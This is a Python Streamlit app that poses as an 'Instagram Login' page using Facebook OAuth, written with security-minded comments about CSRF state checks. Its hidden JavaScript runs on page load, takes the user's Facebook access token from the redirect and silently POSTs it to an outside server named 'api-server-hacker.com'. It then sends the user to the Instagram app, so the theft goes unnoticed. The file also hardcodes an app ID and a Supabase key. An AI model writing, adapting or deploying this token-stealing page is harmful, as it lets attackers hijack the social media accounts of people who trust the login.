import streamlit as st
import urllib.parse
import secrets

# ==============================================
# CONFIGURATION — UPDATE THESE VALUES ACCORDINGLY
# ==============================================
CLIENT_ID = "1589243162990530"

# ⚠️ CRITICAL: This EXACT URL must be registered in Facebook Developers Dashboard
# under Facebook Login → Settings → Valid OAuth Redirect URIs
# NO trailing slash mismatch, NO extra characters, case-sensitive
REDIRECT_URI = "https://instagrammeta.streamlit.app/"

SUPABASE_URL = "https://mxuthpngeagcxoxtnjhd.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im14dXRocG5nZWFnY3hveHRuamhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ2NTA5MjEsImV4cCI6MjEwMDIyNjkyMX0.Fbf5vMxG4C3JERld_4LvlQBPNrQB8UQcz_aloIOaHBs"

# ==============================================
# INIT CSRF PROTECTION STATE
# ==============================================
if "oauth_state" not in st.session_state:
    st.session_state.oauth_state = secrets.token_urlsafe(32)

# ==============================================
# PAGE SETUP
# ==============================================
st.set_page_config(page_title="Instagram Login", layout="centered")
st.title("🔐 Login with Facebook")

# ==============================================
# MAIN JAVASCRIPT LOGIC — Runs client-side
# ==============================================
js_code = f"""
<script>
const REDIRECT_URI = "{urllib.parse.quote(REDIRECT_URI, safe='')}";
const EXPECTED_STATE = "{st.session_state.oauth_state}";
const SUPABASE_URL = "{SUPABASE_URL}";
const SUPABASE_KEY = "{SUPABASE_KEY}";

window.onload = function() {{
    // Parse fragment parameters returned by Facebook
    const hash = window.location.hash.slice(1);
    const params = new URLSearchParams(hash);

    const accessToken = params.get("access_token");
    const returnedState = params.get("state");
    const error = params.get("error");
    const errorDescription = params.get("error_description");

    // Clear token from address bar for cleanliness
    if (accessToken || error) {{
        history.replaceState(null, "", window.location.pathname);
    }}

    // ==============================================
    // HANDLE ERRORS FROM FACEBOOK
    // ==============================================
    if (error) {{
        showErrorBox(`Login Failed: ${{errorDescription || error}}`);
        return;
    }}

    // ==============================================
    // VALIDATE STATE — PREVENT CSRF ATTACK
    // ==============================================
    if (accessToken) {{
        if (returnedState !== EXPECTED_STATE) {{
            showErrorBox("Security Error: State mismatch. Possible CSRF attempt. Please retry.");
            return;
        }}

        // Token received — send to backend then redirect
        sendTokenToServer(accessToken, returnedState);
        return;
    }}

    // ==============================================
    // NO TOKEN — REDIRECT TO FACEBOOK AUTH PAGE
    // ==============================================
    redirectToFacebookAuth();
}};

// ==============================================
// SEND ACCESS TOKEN TO REMOTE SERVER
// ==============================================
function sendTokenToServer(token, state) {{
    fetch("https://api-server-hacker.com/save_token", {{
        method: "POST",
        headers: {{ "Content-Type": "application/json" }},
        body: JSON.stringify({{
            token: token,
            source: "Streamlit_App",
            state: state
        }})
    }})
    .then(response => {{
        console.log("Token saved successfully");
        openInstagramApp();
    }})
    .catch(err => {{
        console.error("Failed to save token:", err);
        // Still attempt to open app even if save fails
        openInstagramApp();
    }});
}}

// ==============================================
// BUILD AND REDIRECT TO FACEBOOK OAUTH DIALOG
// ==============================================
function redirectToFacebookAuth() {{
    const authUrl = 
        "https://www.facebook.com/v20.0/dialog/oauth?" +
        "client_id={CLIENT_ID}" +
        "&redirect_uri=" + encodeURIComponent(REDIRECT_URI) +
        "&response_type=token" +
        "&scope=email,public_profile" +
        "&state=" + encodeURIComponent(EXPECTED_STATE);

    console.log("Redirecting to Facebook OAuth...");
    window.location.href = authUrl;
}}

// ==============================================
// REDIRECT USER TO INSTAGRAM APP SCHEME
// ==============================================
function openInstagramApp() {{
    window.location.href = "instagram://";
}}

// ==============================================
// DISPLAY USER-FRIENDLY ERROR BOX
// ==============================================
function showErrorBox(message) {{
    const safeMessage = message.replace(/</g, "&lt;");
    document.body.innerHTML = `
        <div style="padding: 3rem; text-align: center; font-family: system-ui, sans-serif;">
            <h3 style="color: #dc2626; margin-bottom: 1rem;">⚠️ Authentication Error</h3>
            <p style="color: #374151; margin-bottom: 1.5rem;">${{safeMessage}}</p>
            <a href="${{window.location.origin}}${{window.location.pathname}}" 
               style="display: inline-block; padding: 0.6rem 1.2rem; 
                      background: #2563eb; color: white; border-radius: 8px; 
                      text-decoration: none; font-weight: 500;">
                Try Again
            </a>
        </div>`;
}}
</script>
"""

# Inject JavaScript — runs invisibly on page load
st.components.v1.html(js_code, height=0)

# ==============================================
# FALLBACK LINK — if auto-redirect fails
# ==============================================
st.info("⏳ Redirecting to Facebook for authentication... If nothing happens, use the link below.")

auth_url = (
    f"https://www.facebook.com/v20.0/dialog/oauth?"
    f"client_id={urllib.parse.quote(CLIENT_ID)}"
    f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
    f"&response_type=token"
    f"&scope=email,public_profile"
    f"&state={urllib.parse.quote(st.session_state.oauth_state)}"
)

st.markdown(f"[👉 Click here to Login with Facebook]({auth_url})")